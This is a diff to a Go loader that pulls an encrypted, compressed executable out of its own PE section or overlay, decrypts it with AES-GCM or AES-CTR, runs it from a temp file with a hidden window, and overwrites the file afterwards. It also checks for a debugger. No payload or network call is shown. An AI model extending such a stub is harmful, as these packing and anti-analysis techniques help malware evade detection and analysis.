@@ -7,6 +7,7 @@ import (
 	"compress/gzip"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/rand"
 	"crypto/sha256"
 	"debug/pe"
 	"encoding/binary"
@@ -19,17 +20,18 @@ import (
 )
 
 const (
+	magicV3     = "SBP3"
 	magicV2     = "SBP2"
 	magicLegacy = "SBPK"
 	magicLen    = 4
 	keyLenV2    = 32
-	ivLen       = 16
+	nonceV3Len  = 12
+	ivLenV2     = 16
 	keyLenV1    = 1
 	lengthLen   = 8
 	flagsLen    = 1
 	footerV2Len = keyLenV2 + lengthLen + flagsLen
 	footerV1Len = magicLen + keyLenV1 + lengthLen
-	flagEntXOR  = 1
 )
 
 func main() {
@@ -46,9 +48,9 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Try embedded payload first (SBP2 in last PE section - no overlay)
-	if payload, ok := readEmbeddedV2(data); ok {
-		runV2FromBytes(self, payload)
+	// Try embedded payload first (SBP3/SBP2 in last PE section - no overlay)
+	if payload, magic, ok := readEmbeddedPayload(data); ok {
+		runPayloadByVersion(self, payload, magic)
 		return
 	}
 
@@ -56,23 +58,24 @@ func main() {
 	size := int64(len(data))
 	f := bytes.NewReader(data)
 
-	// Try SBP2 overlay: last 41 bytes = key(32) + payloadLen(8) + flags(1)
+	// Try SBP3/SBP2 overlay: last 41 bytes = key(32) + payloadLen(8) + flags(1)
 	if size >= footerV2Len {
 		footer := make([]byte, footerV2Len)
 		if _, err := f.ReadAt(footer, size-footerV2Len); err != nil {
 			os.Exit(1)
 		}
 		payloadLen := int64(binary.LittleEndian.Uint64(footer[keyLenV2:]))
-		if payloadLen >= ivLen && size >= footerV2Len+payloadLen+magicLen {
+		if payloadLen >= nonceV3Len && size >= footerV2Len+payloadLen+magicLen {
 			magicBuf := make([]byte, magicLen)
 			payloadStart := size - footerV2Len - payloadLen
 			if _, err := f.ReadAt(magicBuf, payloadStart-magicLen); err != nil {
 				os.Exit(1)
 			}
-			if string(magicBuf) == magicV2 {
+			magic := string(magicBuf)
+			if magic == magicV3 || magic == magicV2 {
 				payload := make([]byte, payloadLen)
 				f.ReadAt(payload, payloadStart)
-				runV2FromBytes(self, payload)
+				runPayloadByVersion(self, payload, magic)
 				return
 			}
 		}
@@ -92,52 +95,94 @@ func main() {
 	os.Exit(1)
 }
 
-// readEmbeddedV2 reads SBP2 payload from the last PE section (no overlay).
-func readEmbeddedV2(data []byte) ([]byte, bool) {
+// readEmbeddedPayload reads SBP3/SBP2 payload from the last PE section (no overlay).
+func readEmbeddedPayload(data []byte) ([]byte, string, bool) {
 	peFile, err := pe.NewFile(bytes.NewReader(data))
 	if err != nil {
-		return nil, false
+		return nil, "", false
 	}
 	defer peFile.Close()
 	if len(peFile.Sections) == 0 {
-		return nil, false
+		return nil, "", false
 	}
 	last := peFile.Sections[len(peFile.Sections)-1]
-	if last.Offset == 0 || last.Size < footerV2Len+magicLen+ivLen {
-		return nil, false
+	if last.Offset == 0 || last.Size < footerV2Len+magicLen+nonceV3Len {
+		return nil, "", false
 	}
 	secEnd := int64(last.Offset) + int64(last.Size)
 	if secEnd > int64(len(data)) {
-		return nil, false
+		return nil, "", false
 	}
 	footer := data[secEnd-footerV2Len : secEnd]
 	payloadLen := int64(binary.LittleEndian.Uint64(footer[keyLenV2:]))
 	blockSize := magicLen + payloadLen + footerV2Len
-	if payloadLen < ivLen || blockSize > int64(last.Size) {
-		return nil, false
+	if payloadLen < nonceV3Len || blockSize > int64(last.Size) {
+		return nil, "", false
 	}
 	block := data[secEnd-int64(blockSize) : secEnd]
-	if string(block[:magicLen]) != magicV2 {
-		return nil, false
+	magic := string(block[:magicLen])
+	if magic != magicV3 && magic != magicV2 {
+		return nil, "", false
 	}
-	return block, true
+	return block, magic, true
+}
+
+func runPayloadByVersion(exePath string, payload []byte, magic string) {
+	switch magic {
+	case magicV3:
+		runV3FromBytes(exePath, payload)
+	case magicV2:
+		runV2FromBytes(exePath, payload)
+	default:
+		os.Exit(1)
+	}
+}
+
+func runV3FromBytes(exePath string, payload []byte) {
+	if len(payload) < magicLen+nonceV3Len+footerV2Len {
+		os.Exit(1)
+	}
+	keySeed := payload[len(payload)-footerV2Len : len(payload)-footerV2Len+keyLenV2]
+	nonce := payload[magicLen : magicLen+nonceV3Len]
+	ciphertext := payload[magicLen+nonceV3Len : len(payload)-footerV2Len]
+	key := deriveKey(keySeed, nonce)
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		os.Exit(1)
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		os.Exit(1)
+	}
+	decompressedBytes, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		// Fail closed when integrity/authentication verification fails.
+		os.Exit(1)
+	}
+
+	gr, err := gzip.NewReader(bytes.NewReader(decompressedBytes))
+	if err != nil {
+		os.Exit(1)
+	}
+	defer gr.Close()
+	decompressed, err := io.ReadAll(gr)
+	if err != nil {
+		os.Exit(1)
+	}
+	runPayload(exePath, decompressed)
 }
 
 func runV2FromBytes(exePath string, payload []byte) {
-	keySeed := payload[len(payload)-footerV2Len : len(payload)-footerV2Len+keyLenV2]
-	footer := payload[len(payload)-footerV2Len:]
-	flags := byte(0)
-	if len(footer) > keyLenV2+lengthLen {
-		flags = footer[keyLenV2+lengthLen]
+	if len(payload) < magicLen+ivLenV2+footerV2Len {
+		os.Exit(1)
 	}
-	nonce := payload[magicLen : magicLen+ivLen]
-	ciphertext := payload[magicLen+ivLen : len(payload)-footerV2Len]
+	keySeed := payload[len(payload)-footerV2Len : len(payload)-footerV2Len+keyLenV2]
+	nonce := payload[magicLen : magicLen+ivLenV2]
+	ciphertext := payload[magicLen+ivLenV2 : len(payload)-footerV2Len]
 
-	// Derive key: SHA256(keySeed || nonce)
-	h := sha256.New()
-	h.Write(keySeed)
-	h.Write(nonce)
-	key := h.Sum(nil)
+	// Legacy read path kept for compatibility with SBP2 artifacts.
+	key := deriveKey(keySeed, nonce)
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -146,13 +191,6 @@ func runV2FromBytes(exePath string, payload []byte) {
 	stream := cipher.NewCTR(block, nonce)
 	decrypted := make([]byte, len(ciphertext))
 	stream.XORKeyStream(decrypted, ciphertext)
-
-	if flags&flagEntXOR != 0 {
-		deriveKey := key[0] ^ key[16]
-		for i := range decrypted {
-			decrypted[i] ^= deriveKey ^ byte(i%256)
-		}
-	}
 
 	gr, err := gzip.NewReader(bytes.NewReader(decrypted))
 	if err != nil {
@@ -188,11 +226,11 @@ func runPayload(exePath string, payload []byte) {
 	}
 	// Run from loader's directory so .NET host finds its .dll, deps, etc. in same folder
 	loaderDir := filepath.Dir(exePath)
-	tmpPath := filepath.Join(loaderDir, "sb_"+filepath.Base(exePath)+ext)
-	if err := os.WriteFile(tmpPath, payload, 0755); err != nil {
+	tmpPath, err := createSecureTempExecutable(loaderDir, ext, payload)
+	if err != nil {
 		os.Exit(1)
 	}
-	defer os.Remove(tmpPath)
+	defer secureDeleteTempFile(tmpPath)
 
 	cmd := exec.Command(tmpPath)
 	cmd.Dir = loaderDir // so .NET host finds .dll, runtimeconfig.json, deps.json
@@ -200,13 +238,63 @@ func runPayload(exePath string, payload []byte) {
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	err := cmd.Run()
+	err = cmd.Run()
 	if cmd.ProcessState != nil {
 		os.Exit(cmd.ProcessState.ExitCode())
 	}
 	if err != nil {
 		os.Exit(1)
 	}
+}
+
+func createSecureTempExecutable(dir, ext string, payload []byte) (string, error) {
+	f, err := os.CreateTemp(dir, "sb-*"+ext)
+	if err != nil {
+		return "", err
+	}
+	name := f.Name()
+	if _, err := f.Write(payload); err != nil {
+		f.Close()
+		_ = os.Remove(name)
+		return "", err
+	}
+	if err := f.Close(); err != nil {
+		_ = os.Remove(name)
+		return "", err
+	}
+	return name, nil
+}
+
+func secureDeleteTempFile(path string) {
+	if path == "" {
+		return
+	}
+	// Best-effort cleanup to reduce plaintext artifact lifetime.
+	if st, err := os.Stat(path); err == nil && st.Size() > 0 {
+		if f, openErr := os.OpenFile(path, os.O_WRONLY, 0); openErr == nil {
+			buf := make([]byte, 4096)
+			_, _ = rand.Read(buf)
+			remaining := st.Size()
+			for remaining > 0 {
+				n := int64(len(buf))
+				if remaining < n {
+					n = remaining
+				}
+				_, _ = f.Write(buf[:n])
+				remaining -= n
+			}
+			_ = f.Sync()
+			_ = f.Close()
+		}
+	}
+	_ = os.Remove(path)
+}
+
+func deriveKey(seed, nonce []byte) []byte {
+	h := sha256.New()
+	h.Write(seed)
+	h.Write(nonce)
+	return h.Sum(nil)
 }
 
 func isDebuggerPresent() bool {
